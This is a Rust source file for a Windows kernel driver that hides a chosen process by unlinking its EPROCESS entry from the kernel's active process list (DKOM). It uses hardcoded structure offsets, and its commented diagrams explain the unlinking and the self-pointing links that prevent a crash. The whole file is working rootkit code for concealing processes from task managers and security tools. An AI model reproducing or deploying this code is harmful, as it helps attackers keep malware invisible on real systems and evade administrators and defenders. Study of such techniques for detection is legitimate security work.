
use alloc::string::{String, ToString};
use wdk_sys::LIST_ENTRY;
use wdk_sys::{STATUS_SUCCESS, DRIVER_OBJECT, NTSTATUS, PCUNICODE_STRING, HANDLE};
use core::ptr::addr_of_mut;

pub type PVOID = *mut core::ffi::c_void;

const ACTIVE_PROCESS_LINKS_OFFSET: usize = 0x448;
const PID_OFFSET: usize = 0x440;
const IMAGE_FILE_NAME_OFFSET: usize = 0x5a8;

#[derive(Clone)]
pub struct ShadowedProcess {
    pub eprocess: PVOID,
    pub pid: *mut u32,
    pub list_entry: *mut LIST_ENTRY,
}

impl ShadowedProcess {
    pub unsafe fn from_eprocess(eprocess: PVOID) -> Self {
        let pid = (eprocess as usize + PID_OFFSET) as *mut u32;
        let list_entry = (eprocess as usize + ACTIVE_PROCESS_LINKS_OFFSET) as *mut LIST_ENTRY;
        ShadowedProcess {
            eprocess,
            pid,
            list_entry,
        }
    }

    pub unsafe fn next(&self) -> Self {
        let next_eprocess = ((*self.list_entry).Flink as usize - ACTIVE_PROCESS_LINKS_OFFSET) as PVOID;
        ShadowedProcess::from_eprocess(next_eprocess)
    }

}

extern "system" {
    fn PsGetCurrentProcess() -> HANDLE ;
}


pub fn shadow_process(target_pid: u32) -> Result<bool,String> {
    unsafe {
        let current_process = ShadowedProcess::from_eprocess(PsGetCurrentProcess());
        if (*current_process.pid) == target_pid {
            remove_links(current_process.list_entry);
            return Ok(true);
        }

        let start_process = current_process.clone();
        let mut iter_process = current_process.next();

        while (start_process.eprocess as usize) != (iter_process.eprocess as usize) {
            if *(iter_process.pid) == target_pid {
                remove_links(iter_process.list_entry);
                return Ok(true);
            }
            iter_process = iter_process.next();
        }
    }

    return Err("Process not found".to_string());
}

fn remove_links(current: *mut LIST_ENTRY) {
    // BEFORE OPERATION
    // [Previous Process]   <-->   [Target Process]   <-->   [Next Process]
    //         ^                                                  ^
    //         |                                                  |
    //     (*Target).Blink                                    (*Target).Flink

    // AFTER OPERATION             
    //                              ---------
    //                              ↓       |
    //                [Target Process] ------
    //
    // [Previous]   <----------------->   [Next]
    //     (*Previous).Flink       (*Next).Blink


    let previous: *mut LIST_ENTRY = unsafe { (*current).Blink };
    let next: *mut LIST_ENTRY = unsafe { (*current).Flink };

    // Bind Flink's previous process to the next process
    unsafe { (*previous).Flink = next };

    // Bind Blink's next process to the previous process
    unsafe { (*next).Blink = previous };

    // This will re-write the current LIST_ENTRY to point to itself to avoid BSOD
    unsafe { (*current).Blink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
    unsafe { (*current).Flink = addr_of_mut!((*current).Flink).cast::<LIST_ENTRY>() };
}